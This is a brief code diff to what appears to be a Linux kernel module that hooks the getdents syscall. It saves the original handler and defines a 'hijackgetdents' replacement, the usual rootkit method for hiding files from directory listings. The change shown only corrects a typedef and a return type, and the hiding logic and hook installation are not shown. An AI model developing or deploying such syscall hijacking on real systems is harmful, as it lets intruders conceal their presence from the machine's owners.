@@ -27,10 +27,10 @@ struct linux_dirent{
 
 };
 
-typedef asmlinkage long (*originalGetDentsA) (unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
+typedef asmlinkage long (*originalGetDentsA)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
 originalGetDentsA originalGetDents=NULL;
 
-asmlinkage long* hijackgetdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count){
+asmlinkage long hijackgetdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count){
     struct linux_dirent *hijackedDirent;
     char* fileNames;
     long original = originalGetDents(fd, dirp, count);
